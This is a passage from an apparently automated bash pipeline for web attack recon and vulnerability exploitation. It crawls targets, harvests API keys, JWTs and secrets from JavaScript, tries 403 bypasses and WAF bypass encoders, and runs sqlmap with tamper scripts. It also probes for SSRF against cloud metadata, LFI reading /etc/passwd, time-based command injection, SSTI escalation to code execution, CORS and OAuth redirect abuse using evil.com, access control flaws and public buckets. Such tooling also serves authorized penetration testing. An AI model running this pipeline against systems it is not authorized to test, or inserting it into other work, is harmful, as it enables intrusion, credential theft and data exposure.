    timeout 180 katana -list "$W/subs/live.txt" -jc -kf all -d "$D_KATANA" -timeout 10 -c "$T_KATANA" \
      ${COOKIE:+-H "Cookie: $COOKIE"} -silent -o "$O/katana.txt" 2>/dev/null || true
    [[ "$F_HEADLESS" == true ]] && { timeout 180 katana -u "https://$DOMAIN" -headless -jc -kf all -d 2 -timeout 15 -c 20 -silent -o "$O/katana_h.txt" 2>/dev/null || true; cat "$O/katana_h.txt" >> "$O/katana.txt"; }; }
  cat "$O"/*.txt 2>/dev/null | sort -u > "$O/all_raw.txt"
  if has uro; then uro < "$O/all_raw.txt" 2>/dev/null > "$O/all.txt"; else cp "$O/all_raw.txt" "$O/all.txt"; fi
  u "$O/all.txt"; log OK "Total URLs (unique): $(cnt "$O/all.txt")"
  grep -E '\?[a-zA-Z0-9_%-]+=' "$O/all.txt" | sort -u > "$O/params.txt"
  for p in xss sqli ssrf redirect lfi rce idor interestingparams; do
    gf "$p" "$O/all.txt" 2>/dev/null | sort -u > "$O/gf/$p.txt"; u "$O/gf/$p.txt"
  done
  grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/params.txt" | sed 's/^[?&]//;s/=//' | sort -u > "$W/params/all.txt"
  log OK "Param URLs: $(cnt "$O/params.txt") | unique params: $(cnt "$W/params/all.txt")"
}

# ─────────────────────────── MOD 03 — JS → PATHS ONLY ───────────────────────────
mod_js_paths() {
  step "03 JS ANALYSIS → PATHS ONLY (endpoints stripped, deduped)"
  local O="$W/js"
  grep -E '\.js(\?|$)' "$W/urls/all.txt" 2>/dev/null | grep -iE "$DOMAIN" | sort -u > "$O/js_urls.txt"
  has getJS && { while IFS= read -r u; do getJS --url "$u" --complete 2>/dev/null | grep -E '\.js(\?|$)'; done < "$W/subs/live.txt" | sort -u >> "$O/js_urls.txt" || true; }
  u "$O/js_urls.txt"; log OK "Unique JS files: $(cnt "$O/js_urls.txt")"
  head -200 "$O/js_urls.txt" > /tmp/js_in_$$; python3 "$W/tools/js_dl.py" "$O/dl" /tmp/js_in_$$ >/dev/null 2>&1 || true; rm -f /tmp/js_in_$$
  log OK "Downloaded: $(ls "$O/dl" 2>/dev/null | wc -l) files"
  local JSALL=""
  [[ -n "$(ls "$O/dl"/*.js 2>/dev/null)" ]] && JSALL=$(cat "$O/dl"/*.js 2>/dev/null)
  if [[ -n "$JSALL" ]]; then
    echo "$JSALL" | grep -oE 'AKIA[A-Z0-9]{16}' | sort -u > "$O/aws_keys.txt"
    echo "$JSALL" | grep -oE 'AIza[0-9A-Za-z_-]{35}' | sort -u > "$O/gcp_keys.txt"
    echo "$JSALL" | grep -oE 'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' | sort -u > "$O/jwts.txt"
    echo "$JSALL" | grep -oiE '(api_?key|apikey|secret|password|passwd|token|auth_?token|access_?token|private_?key|client_?secret)["'"'"'\s]*[:=]["'"'"'\s]*["'"'"'][a-zA-Z0-9._/+\-]{8,}["'"'"']' | sort -u > "$O/secrets.txt"
    echo "$JSALL" | grep -oE '(innerHTML|outerHTML|document\.write|\.html\(|eval\(|location\.href|location\.hash|document\.cookie)[^;,\n]{0,100}' | sort -u > "$O/dom_sinks.txt"
    echo "$JSALL" | grep -oiE 'postMessage' | sort -u > "$O/postmsg.txt"
    echo "$JSALL" | grep -oE '[a-zA-Z0-9_-]+\.s3[\.-][a-zA-Z0-9.-]*\.amazonaws\.com' | sort -u > "$O/s3.txt"
    [[ -s "$O/aws_keys.txt" ]] && log H "AWS keys in JS: $(cnt "$O/aws_keys.txt")"
    [[ -s "$O/secrets.txt" ]] && log H "Potential secrets in JS: $(cnt "$O/secrets.txt")"
    [[ -s "$O/jwts.txt" ]] && log W "JWTs in JS: $(cnt "$O/jwts.txt") — will crack/forge"
  else
    for f in aws_keys gcp_keys jwts secrets dom_sinks postmsg s3; do touch "$O/$f.txt"; done
  fi
  [[ -f "$HOME/tools/SecretFinder/SecretFinder.py" ]] && find "$O/dl" -name '*.js' | head -100 | while IFS= read -r f; do
    python3 "$HOME/tools/SecretFinder/SecretFinder.py" -i "$f" -o cli 2>/dev/null; done >> "$O/secrets_found.txt" 2>/dev/null || true
  u "$O/secrets_found.txt"
  python3 "$W/tools/js_paths.py" "$O/dl" "$DOMAIN" 2>/dev/null > "$O/paths/all.txt" || true
  if [[ -f "$HOME/tools/LinkFinder/linkfinder.py" ]]; then
    find "$O/dl" -name '*.js' | head -100 | while IFS= read -r f; do
      python3 "$HOME/tools/LinkFinder/linkfinder.py" -i "$f" -o cli 2>/dev/null
    done | grep -oE '^/[a-zA-Z0-9_./?=&%{}:@-]{2,}' >> "$O/paths/all.txt" || true
  fi
  u "$O/paths/all.txt"
  grep -vE '^https?://' "$O/paths/all.txt" | sort -u > "$O/paths/clean.txt" 2>/dev/null
  mv "$O/paths/clean.txt" "$O/paths/all.txt" 2>/dev/null || true
  cat "$O/paths/all.txt" "$W/endpoints/all.txt" 2>/dev/null | sort -u > /tmp/end_$$; mv /tmp/end_$$ "$W/endpoints/all.txt" 2>/dev/null || true
  log OK "Unique JS paths: $(cnt "$O/paths/all.txt") → $O/paths/all.txt"
}

# ─────────────────────────── MOD 04 — PATHS + 403 + PARAMS ───────────────────────────
mod_paths() {
  step "04 PATH DISCOVERY · 403 BYPASS · PARAM MINING"
  local O="$W/paths"
  ensure_live
  local WL="/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
  [[ -f "$CUSTOM_WL" ]] && WL="$CUSTOM_WL"; [[ ! -f "$WL" ]] && WL="/usr/share/wordlists/dirb/common.txt"
  if has ffuf; then
    log I "ffuf raft (top 20 hosts)…"
    head -20 "$W/subs/live.txt" | while IFS= read -r t; do
      ffuf -u "${t}/FUZZ" -w "$WL" -t "$T_FFUF" -mc 200,201,204,301,302,307,401,403,405,500 \
        ${COOKIE:+-b "$COOKIE"} ${PROXY:+-x "$PROXY"} -of json -o "$O/ffuf_$(sn "$t").json" -s 2>/dev/null || true
    done
    local API_WL="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"; [[ ! -f "$API_WL" ]] && API_WL="$WL"
    log I "ffuf api + sensitive files…"
    ffuf -u "https://$DOMAIN/FUZZ" -w "$API_WL" -t "$T_FFUF" -mc 200,201,301,302,401,403 -of json -o "$O/api.json" -s 2>/dev/null || true
    ffuf -u "https://$DOMAIN/FUZZ" -w "/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt" -t "$T_FFUF" -mc 200,301,302 -of json -o "$O/files.json" -s 2>/dev/null || true
    cat "$O"/ffuf_*.json "$O/api.json" "$O/files.json" 2>/dev/null | jq -r '.results[]?.url' 2>/dev/null | sort -u > "$W/endpoints/all.txt" || true
    if [[ "$F_QUICK" == false ]]; then
      log I "recursive ffuf on found dirs…"
      grep -E '/$' "$W/endpoints/all.txt" | head -15 | while IFS= read -r d; do
        ffuf -u "${d}FUZZ" -w "$WL" -t "$T_FFUF" -mc 200,204,301,302,401,403 -of json -o "$O/rec_$(sn "$d").json" -s 2>/dev/null || true
      done
      cat "$O"/rec_*.json 2>/dev/null | jq -r '.results[]?.url' 2>/dev/null >> "$W/endpoints/all.txt" || true
    fi
  fi
  u "$W/endpoints/all.txt"
  log I "403 bypass (${#PATH_TRICKS[@]} path × ${#HDR_BYPASS[@]} header tricks)…"
  local BO="$O/403_bypass.txt"
  while IFS= read -r u; do
    local pth base; pth=$(echo "$u" | grep -oP "(?<=${DOMAIN}).*" || true); base=$(echo "$u" | grep -oP 'https?://[^/]+' || true)
    [[ -z "$pth" || -z "$base" ]] && continue
    for t in "${PATH_TRICKS[@]}"; do
      probe "${base}${pth}${t}"
      if [[ "$RC" == "200" ]]; then soft404 "${base}${pth}${t}" "$RB" || echo "PATH|${base}${pth}${t}" >> "$BO"; fi
    done
    for h in "${HDR_BYPASS[@]}"; do
      local hv="${h//%P%/$pth}"
      mkhdr; RC=$(curlx -H "$hv" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
      [[ "$RC" == "200" ]] && echo "HDR|$hv|$u" >> "$BO"
    done
  done < "$W/paths/403_targets.txt" 2>/dev/null || true
  u "$BO"; [[ -s "$BO" ]] && log H "403 BYPASSES (unique, non-baseline): $(cnt "$BO") → $BO"
  has arjun && { log I "arjun param mining (top 40)…"
    head -40 "$W/subs/status_200.txt" 2>/dev/null | while IFS= read -r u; do
      arjun -u "$u" -oJ "$W/params/arjun_$(sn "$u").json" -t 20 -q 2>/dev/null || true
    done
    cat "$W/params"/arjun_*.json 2>/dev/null | jq -r '.params[]?' 2>/dev/null | sort -u >> "$W/params/all.txt" || true
    u "$W/params/all.txt"; }
  grep -iE "(admin|api/v[0-9]|graphql|swagger|actuator|debug|backup|config|secret|key|token|login|auth|dashboard|panel|manage|internal|dev|test|staging|upload|download|export|import|reset|forgot|webhook|payment|oauth|oidc|saml|sso|\.env|\.git|phpinfo|server-status|metrics|prometheus)" \
    "$W/endpoints/all.txt" 2>/dev/null | sort -u > "$W/endpoints/interesting.txt"
  log OK "Endpoints (unique): $(cnt "$W/endpoints/all.txt") | interesting: $(cnt "$W/endpoints/interesting.txt")"
}

# ─────────────────────────── MOD 05 — NUCLEI ───────────────────────────
mod_nuclei() {
  step "05 NUCLEI — full · cve · params · takeover"
  has nuclei || { log W "nuclei missing — skip"; return; }
  local O="$W/vulns/nuclei"; mkdir -p "$O"
  nuclei -update-templates -silent 2>/dev/null || true
  log I "nuclei full (t: $T_NUCLEI, r: $R_NUCLEI/s)…"
  local NARGS=(-list "$W/subs/live.txt" -severity critical,high,medium,low,info
    -tags "cve,rce,sqli,xss,lfi,ssrf,idor,auth,misconfig,exposure,token,default-login,panel,backup,debug,takeover,tech"
    -c "$T_NUCLEI" -rate-limit "$R_NUCLEI" -timeout "$TO" -retries 2 -follow-redirects -stats
    -json-export "$O/full.json" -o "$O/full.txt")
  [[ -n "$COOKIE" ]] && NARGS+=(-H "Cookie: $COOKIE"); [[ -n "$PROXY" ]] && NARGS+=(-proxy "$PROXY")
  nuclei "${NARGS[@]}" 2>/dev/null || true
  jq -r 'select(.info.severity=="critical" or .info.severity=="high") | "[\(.info.severity|ascii_upcase)] [\(.info.name)] \(.host) \(.matched-at)"' "$O/full.json" 2>/dev/null | sort -u > "$O/critical_high.txt" || true
  [[ -s "$O/critical_high.txt" ]] && log H "Nuclei crit/high (unique): $(cnt "$O/critical_high.txt")"
  [[ -s "$W/urls/params.txt" ]] && nuclei -list "$W/urls/params.txt" -t "$HOME/nuclei-templates/dast" -t "$HOME/nuclei-templates/fuzzing" -c 30 -rate-limit 100 -silent -o "$O/params.txt" 2>/dev/null || true
  nuclei -list "$W/subs/live.txt" -tags cve -c "$T_NUCLEI" -rate-limit 100 -silent -o "$O/cves.txt" 2>/dev/null || true
  nuclei -list "$W/subs/live.txt" -tags takeover -silent -o "$O/takeover.txt" 2>/dev/null || true
  u "$O/full.txt" "$O/critical_high.txt" "$O/cves.txt" "$O/takeover.txt" 2>/dev/null || true
  while IFS= read -r h; do
    h=$(echo "$h" | grep -oE 'https?://[^ ]+' | head -1 || echo "$h")
    qverify "takeover" "$h" "nuclei-match" "high"
  done < "$O/takeover.txt" 2>/dev/null || true
  log OK "Nuclei findings (unique): $(cnt "$O/full.txt")"
}

# ─────────────────────────── MOD 06 — WAF ───────────────────────────
mod_waf() {
  [[ "$G_FULL" == false && "$M_WAF" == false ]] && return
  [[ "$F_QUICK" == true && "$M_WAF" == false ]] && return
  step "06 WAF fingerprint + encoder battery"
  local O="$W/waf" MAIN; MAIN=$(head -1 "$W/subs/live.txt" 2>/dev/null); [[ -z "$MAIN" ]] && MAIN="https://$DOMAIN"
  has wafw00f && { wafw00f "$MAIN" -a -o "$O/wafw00f.json" --format=json 2>/dev/null || true
    jq -r '.detected[]?.waf' "$O/wafw00f.json" 2>/dev/null | sort -u > "$O/detected.txt" || true; }
  mkhdr; local hdrs; hdrs=$(curlx -I -- "$MAIN" 2>/dev/null | tr '[:upper:]' '[:lower:]')
  for sig in "cloudflare|cf-ray" "akamai|x-akamai" "aws|x-amzn-requestid" "imperva|x-iinfo" "f5|x-wa-info" "sucuri|x-sucuri" "fastly|x-fastly" "modsec|mod_security"; do
    local w s; w="${sig%%|*}"; s="${sig#*|}"
    echo "$hdrs" | grep -qiE "$s" && { echo "$w" >> "$O/detected.txt"; log W "WAF: $w (header)"; }
  done
  u "$O/detected.txt"
  if [[ -s "$O/detected.txt" ]]; then
    log I "WAF present — mutation encoder battery…"
    for e in "${WAF_ENC[@]}"; do
      probe "${MAIN}/?__t=${e}"
      echo "$RB" | grep -qiE "(<script|onload|alert)" && echo "REFLECTED|$e" >> "$O/bypass_works.txt"
      [[ "$RC" == "200" ]] && echo "PASSED|$e" >> "$O/bypass_passed.txt"
    done
    u "$O/bypass_works.txt" "$O/bypass_passed.txt"
    log OK "Reflected: $(cnt "$O/bypass_works.txt") | passed: $(cnt "$O/bypass_passed.txt")"
  else log OK "No WAF detected on $MAIN"; fi
}

# ─────────────────────────── MOD 07 — WEB VULN DETECT → QVERIFY → QUEUE ───────────────────────────
mod_web() {
  local O="$W/vulns" U="$W/urls" LIVE="$W/subs/live.txt"
  mkdir -p "$O"/{xss,sqli/detect,ssrf,lfi,cmdi,ssti,csrf,redirect,idor}
  if [[ "$M_XSS" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "07a XSS (dalfox → qverify → queue)"
    has dalfox || log W "dalfox missing"
    local XI="$U/gf/xss.txt"; [[ ! -s "$XI" ]] && XI="$U/params.txt"
    head -500 "$XI" > /tmp/dx_$$ 2>/dev/null || true
    timeout 300 dalfox file /tmp/dx_$$ --silence --skip-bav --no-color --worker "$T_DALFOX" \
      --timeout 5 --delay 0 --only-discovery ${COOKIE:+--cookie "$COOKIE"} ${PROXY:+--proxy "$PROXY"} \
      --output "$O/xss/dalfox.json" --format json 2>/dev/null || true
    rm -f /tmp/dx_$$
    jq -r 'select(.data."PoC"!=null or .data."payload"!=null) | "\(.data.url)\t\(.data."PoC" // .data.payload)"' "$O/xss/dalfox.json" 2>/dev/null | sort -u > "$O/xss/raw.txt" || true
    while IFS=$'\t' read -r u p; do [[ -n "$u" ]] && qverify "xss" "$u" "$p" "high"; done < "$O/xss/raw.txt"
    log OK "XSS verified: $(qcount xss)"
  fi
  if [[ "$M_SQLI" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "07b SQLi (sqlmap detect → qverify SLEEP → queue)"
    has sqlmap || log W "sqlmap missing"
    local SI="$U/gf/sqli.txt"; [[ ! -s "$SI" ]] && SI="$U/params.txt"
    python3 "$W/tools/active.py" 30 < "$SI" 2>/dev/null | head -25 > /tmp/sqi_$$
    if [[ -s /tmp/sqi_$$ ]]; then
      timeout 600 sqlmap -m /tmp/sqi_$$ --batch --level=2 --risk=1 --random-agent --threads=5 --timeout=10 --retries=1 \
        --tamper=space2comment,randomcase --no-cast --smart --ignore-code=403 \
        --answers="follow=N,reduce=Y,normalize=Y,proceed=C,test=Y,integer=Y" \
        ${COOKIE:+--cookie="$COOKIE"} ${PROXY:+--proxy="$PROXY"} \
        --output-dir="$O/sqli/detect" 2>/dev/null || true
      find "$O/sqli/detect" -name '*.log' -size +0c | while IFS= read -r f; do
        grep -l "is vulnerable" "$f" 2>/dev/null && grep -oP "url: \K.*" "$f" | head -1
      done | sort -u > "$O/sqli/injectable_raw.txt" || true
      while IFS= read -r u; do [[ -n "$u" ]] && qverify "sqli" "$u" "sqlmap-injectable" "critical"; done < "$O/sqli/injectable_raw.txt"
      log OK "SQLi verified: $(qcount sqli)"
    else log W "no active SQLi targets"; fi
    rm -f /tmp/sqi_$$
  fi
  if [[ "$M_SSRF" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "07c SSRF (metadata battery → qverify → queue)"
    local SS="$U/gf/ssrf.txt"; [[ ! -s "$SS" ]] && SS="$U/params.txt"
    while IFS= read -r u; do
      for p in "${SSRF_P[@]}"; do
        local t; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
        probe -L "$t"
        echo "$RB" | grep -qiE "(ami-id|computeMetadata|169\.254|ec2|arn:aws|meta-data|user-data)" && {
          qverify "ssrf" "$t" "$p" "critical"; break; }
      done
    done < <(head -120 "$SS" 2>/dev/null)
    log OK "SSRF verified: $(qcount ssrf)"
  fi
  if [[ "$M_LFI" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "07d LFI (payload battery → qverify root:x: → queue)"
    local LI="$U/gf/lfi.txt"; [[ ! -s "$LI" ]] && LI="$U/params.txt"
    while IFS= read -r u; do
      for p in "${LFI_P[@]}"; do
        local t; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
        probe "$t"
        if echo "$RB" | grep -qE "(root:x:|bin:x:|daemon:x:)"; then
          qverify "lfi" "$t" "$p" "high"; break
        fi
      done
    done < <(head -120 "$LI" 2>/dev/null)
    log OK "LFI verified: $(qcount lfi)"
  fi
  if [[ "$F_QUICK" == false && ("$M_VULN" == true || "$G_FULL" == true) ]]; then
    step "07e CMDi (time-based → qverify double-timing → queue)"
    while IFS= read -r u; do
      for p in "${CMDI_DET[@]}"; do
        local t t2 t0 t1 base_ms p_ms
        t=$(echo "$u" | qsreplace "$p" 2>/dev/null); t2=$(echo "$u" | qsreplace "x" 2>/dev/null)
        t0=$(date +%s%N); probe "$t2"; t1=$(date +%s%N); base_ms=$(( (t1-t0)/1000000 ))
        t0=$(date +%s%N); probe "$t"; t1=$(date +%s%N); p_ms=$(( (t1-t0)/1000000 ))
        if [[ $((p_ms-base_ms)) -gt 2000 ]]; then
          qverify "cmdi" "$t" "time-delay-${p_ms}ms" "critical"; break
        fi
      done
    done < <(head -60 "$U/params.txt" 2>/dev/null)
    log OK "CMDi verified: $(qcount cmdi)"
  fi
  if [[ "$M_PMF" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "07f SSTI (arithmetic → engine fingerprint → queue)"
    while IFS= read -r u; do
      for p in "${SSTI_PROBES[@]}"; do
        local t; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
        probe "$t"
        if echo "$RB" | grep -qP '(^|[^0-9])49([^0-9]|$)' || echo "$RB" | grep -q "7777777"; then
          local eng="unknown"
          for entry in "${SSTI_RCE[@]}"; do
            local e pl t2; e="${entry%%|*}"; pl="${entry#*|}"
            t2=$(echo "$u" | qsreplace "$pl" 2>/dev/null); probe "$t2"
            echo "$RB" | grep -qE "uid=[0-9]+" && { eng="$e"; break; }
          done
          qverify "ssti" "$t" "$eng" "critical"; break
        fi
      done
    done < <(head -60 "$U/params.txt" 2>/dev/null)
    log OK "SSTI verified: $(qcount ssti)"
  fi
  if [[ "$M_CSRF" == true || "$M_CORS" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "07g CSRF + CORS (form scrape + origin battery → qverify → queue)"
    head -40 "$LIVE" 2>/dev/null | python3 "$W/tools/form_scrape.py" 2>/dev/null > "$O/csrf/forms.tsv" || true
    while IFS=$'\t' read -r act mtd ins; do
      [[ -z "$act" ]] && continue
      probe "$act"
      local tok; tok=$(echo "$RB" | grep -iE '(csrf|_token|authenticity_token|nonce|__requestverificationtoken)' | head -1 || true)
      if [[ -z "$tok" && "$mtd" == "POST" ]]; then qverify "csrf" "$act" "$ins" "medium"; fi
    done < "$O/csrf/forms.tsv" 2>/dev/null || true
    for o in "https://evil.com" "https://attacker.$DOMAIN" "null" "https://$DOMAIN.evil.com" "https://evil$DOMAIN" "http://$DOMAIN"; do
      while IFS= read -r u; do
        mkhdr; local h; h=$(curlx -H "Origin: $o" -I -- "$u" 2>/dev/null || true)
        local acao acac; acao=$(echo "$h" | grep -i 'access-control-allow-origin' | head -1 || true)
        acac=$(echo "$h" | grep -i 'access-control-allow-credentials' | head -1 || true)
        [[ -z "$acao" ]] && continue
        if echo "$acao" | grep -qiE "(\*|evil\.com|null|${DOMAIN}\.evil|evil${DOMAIN}|attacker\.)"; then
          local sev="medium"; echo "$acac" | grep -qi true && sev="high"
          qverify "cors" "$u" "$o" "$sev"
        fi
      done < <(head -30 "$LIVE" 2>/dev/null)
    done
    log OK "CSRF verified: $(qcount csrf) | CORS verified: $(qcount cors)"
  fi
  if [[ "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "07h Open redirect (chain check → qverify evil.com → queue)"
    local RI="$U/gf/redirect.txt"; [[ ! -s "$RI" ]] && RI="$U/params.txt"
    while IFS= read -r u; do
      for p in "${REDIRECT_P[@]}"; do
        local t final; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
        probe -L "$t"
        final=$(curlx -o /dev/null -w '%{url_effective}' -- "$t" 2>/dev/null || true)
        [[ -n "$final" ]] && echo "$final" | grep -qiE "^(https?://)?(www\.)?evil\.com" && {
          qverify "redirect" "$t" "$final" "medium"; }
      done
    done < <(head -60 "$RI" 2>/dev/null)
    log OK "Redirect verified: $(qcount redirect)"
  fi
}

# ─────────────────────────── MOD 08 — AUTHZ (IDOR/BAC/OAuth/JWT) ───────────────────────────
mod_authz() {
  local O="$W/vulns" U="$W/urls"
  if [[ "$M_IDOR" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "08a IDOR / BAC (extract → probe → qverify → queue)"
    grep -oE 'https?://[^ ]+[?&][a-zA-Z0-9_]+=[0-9]+' "$U/all.txt" 2>/dev/null | sort -u > "$O/idor/num_urls_raw.txt"
    grep -oP '[?&/][a-zA-Z0-9_-]*/?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' "$U/all.txt" 2>/dev/null | sort -u > "$O/idor/uuids.txt"
    while IFS= read -r u; do [[ -n "$u" ]] && qverify "idor" "$u" "numeric-id" "medium"; done < <(head -50 "$O/idor/num_urls_raw.txt")
    local PRIV="$W/classified/bac/priv.txt"
    grep -iE "(/admin|/manage|/dashboard|/panel|/superuser|/staff|/internal|/back-?office|/cms|/api/v?[0-9]?/?(users?|accounts?|orders?|admin|roles?|permissions?))" \
      "$W/endpoints/all.txt" "$U/all.txt" 2>/dev/null | sort -u > "$PRIV" || true
    while IFS= read -r ep; do
      probe "$ep"
      case "$RC" in
        200) soft404 "$ep" "$RB" || { echo "$ep" >> "$O/idor/bac_unauthed.txt"; qverify "bac" "$ep" "unauthenticated-200" "high"; } ;;
        403) echo "$ep" >> "$O/idor/bac_403.txt" ;;
      esac
    done < "$PRIV" 2>/dev/null || true
    while IFS= read -r u; do
      for m in POST PUT DELETE PATCH; do
        RC=$(curlx -X "$m" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
        [[ "$RC" =~ ^(200|201|204)$ ]] && qverify "bac" "$u" "method-$m" "high"
      done
    done < <(head -40 "$PRIV" 2>/dev/null)
    u "$O/idor/num_urls_raw.txt" "$O/idor/uuids.txt" "$O/idor/bac_403.txt" "$O/idor/bac_unauthed.txt"
    log OK "IDOR verified: $(qcount idor) | BAC verified: $(qcount bac)"
  fi
  if [[ "$M_OAUTH" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
    step "08b OAuth flow analysis"
    local OO="$W/classified/oauth"
    grep -iE "/(oauth|oauth2|oidc|openid|connect|sso|authorize|token|callback|userinfo|jwks|\.well-known/openid-configuration)(/|$|\?)" "$U/all.txt" 2>/dev/null | sort -u > "$OO/endpoints.txt"
    grep -iE "[?&](client_id|client_secret|redirect_uri|response_type|grant_type|scope|state|nonce|code_challenge|code_verifier|code|access_token|refresh_token)=" "$U/all.txt" 2>/dev/null | sort -u > "$OO/params.txt"
    grep -iE "[?&#](access_token|id_token|token|jwt|bearer)=[a-zA-Z0-9._-]{20,}" "$U/all.txt" 2>/dev/null | sort -u > "$OO/tokens_in_url.txt"
    [[ -s "$OO/tokens_in_url.txt" ]] && log H "Tokens in URLs (unique): $(cnt "$OO/tokens_in_url.txt")"
    grep -iE "[?&]redirect_uri=" "$U/all.txt" 2>/dev/null | head -30 | while IFS= read -r u; do
      local t final; t=$(echo "$u" | sed 's/redirect_uri=[^&]*/redirect_uri=https:\/\/evil.com/')
      probe -L "$t"
      final=$(curlx -o /dev/null -w '%{url_effective}' -- "$t" 2>/dev/null || true)
      echo "$final" | grep -q "evil.com" && qverify "oauth" "$t" "open-redirect_uri" "high"
    done || true
    grep -iE "/(authorize|auth)\?" "$U/all.txt" 2>/dev/null | while IFS= read -r u; do
      echo "$u" | grep -qiE "[?&]state=" || echo "$u" >> "$OO/no_state.txt"
      echo "$u" | grep -qiE "code_challenge" || echo "$u" >> "$OO/no_pkce.txt"
    done || true
    u "$OO/endpoints.txt" "$OO/params.txt" "$OO/tokens_in_url.txt" "$OO/no_state.txt" "$OO/no_pkce.txt"
    log OK "OAuth endpoints (unique): $(cnt "$OO/endpoints.txt") | verified: $(qcount oauth)"
  fi
  if [[ -s "$W/js/jwts.txt" && ("$M_OAUTH" == true || "$M_VULN" == true || "$G_FULL" == true) ]]; then
    step "08c JWT analysis (alg:none → queue)"
    while IFS= read -r jwt; do
      local hdr; hdr=$(echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null || true)
      echo "$hdr" | grep -qi '"alg"[[:space:]]*:[[:space:]]*"none"' && qverify "jwt" "$jwt" "alg-none" "critical"
    done < "$W/js/jwts.txt"
    log OK "JWT verified: $(qcount jwt)"
  fi
}

# ─────────────────────────── MOD 09 — CLOUD / EXPOSURE / TECH ───────────────────────────
mod_cloud() {
  step "09 EXPOSURE · BUCKETS · TECH CHECKS"
  local O="$W/vulns/misconfig" LIVE="$W/subs/live.txt"
  while IFS= read -r base; do
    for p in "${META_FILES[@]}"; do
      probe "${base}${p}"
      if [[ "$RC" == "200" && "$RL" -gt 10 ]]; then
        soft404 "${base}${p}" "$RB" && continue
        echo "EXPOSED|${base}${p}|${RL}b" >> "$O/sensitive.txt"
        log H "Exposed (verified): ${base}${p} (${RL}b)"
        [[ "$p" == */.git/* ]] && curlx -- "${base}/.git/config" | head -5 >> "$O/git_config.txt" 2>/dev/null || true
      fi
    done
  done < <(head -12 "$LIVE" 2>/dev/null)
  u "$O/sensitive.txt" "$O/git_config.txt"
  log I "bucket enumeration (s3/gcs)…"
  for n in "$DOMAIN" "${DOMAIN//./-}" "backup.$DOMAIN" "uploads.$DOMAIN" "assets.$DOMAIN"; do
    probe "https://$n.s3.amazonaws.com/?list-type=2&max-keys=3"
    echo "$RB" | grep -q "ListBucketResult" && { echo "S3_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public S3 bucket (verified): $n"; }
    probe "https://storage.googleapis.com/$n?prefix="
    echo "$RB" | grep -q "ListBucketResult" && { echo "GCS_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public GCS bucket (verified): $n"; }
  done
  u "$O/buckets.txt"
  local TECH="$W/subs/tech.txt"
  grep -qi "wordpress" "$TECH" 2>/dev/null && {
    head -3 "$LIVE" | while IFS= read -r b; do
      local ue; ue=$(curlx -- "${b}/wp-json/wp/v2/users" 2>/dev/null)
      echo "$ue" | grep -q '"id"' && { echo "WP_USER_ENUM|$b" >> "$O/tech_findings.txt"; log H "WP user enum (verified): $b"; }
    done; }
  for entry in "${TECH_PATHS[@]}"; do
    local tech path; tech="${entry%%|*}"; path="${entry#*|}"
    grep -qi "$tech" "$TECH" 2>/dev/null || continue
    head -3 "$LIVE" | while IFS= read -r b; do
      probe "${b}${path}"
      [[ "$RC" == "200" ]] && { soft404 "${b}${path}" "$RB" || { echo "TECH_EXPOSED|${tech}|${b}${path}" >> "$O/tech_findings.txt"; log H "${tech} exposed: ${b}${path}"; }; }
    done
  done
  u "$O/tech_findings.txt"
  log OK "Sensitive (verified, unique): $(cnt "$O/sensitive.txt") | buckets: $(cnt "$O/buckets.txt")"
}

# ─────────────────────────── MOD 10 — API SCHEMA ───────────────────────────
mod_api() {
  [[ "$M_API" == false && "$G_FULL" == false ]] && return
  step "10 API SCHEMA — OpenAPI · GraphQL · undocumented"
  local O="$W/api" LIVE="$W/subs/live.txt"; mkdir -p "$O"
  while IFS= read -r base; do
    for p in "${API_PATHS[@]}"; do
      probe "${base}${p}"
      [[ "$RC" == "200" ]] && echo "$RB" | grep -qiE "(swagger|openapi|\"paths\"|\"info\")" && {
        echo "${base}${p}" >> "$O/openapi_specs.txt"; log H "API spec (verified): ${base}${p}"; }
    done
  done < <(head -8 "$LIVE" 2>/dev/null)
  while IFS= read -r base; do
    for p in "${GQL_PATHS[@]}"; do
      local g; g=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -- "${base}${p}" 2>/dev/null | head -c 2000 || true)
      if echo "$g" | grep -qiE '(__typename|"errors")'; then
        echo "${base}${p}" >> "$O/graphql_endpoints.txt"; log H "GraphQL endpoint (verified): ${base}${p}"
        local gi; gi=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' -- "${base}${p}" 2>/dev/null | head -c 2000 || true)
        echo "$gi" | grep -q "__schema" && { echo "${base}${p}" >> "$O/graphql_introspection.txt"; log H "GraphQL introspection OPEN (verified): ${base}${p}"; }
      fi
    done
  done < <(head -8 "$LIVE" 2>/dev/null)
  log I "undocumented API version fuzz…"
  for base in /api /api/v1 /api/v2 /api/v3 /rest /backend; do
    probe "https://$DOMAIN${base}"
    [[ "$RC" =~ ^(200|201|401|403)$ ]] && { soft404 "https://$DOMAIN${base}" "$RB" || echo "API_BASE [${RC}]: ${base}" >> "$O/api_bases.txt"; }
  done
  u "$O/openapi_specs.txt" "$O/graphql_endpoints.txt" "$O/graphql_introspection.txt" "$O/api_bases.txt"
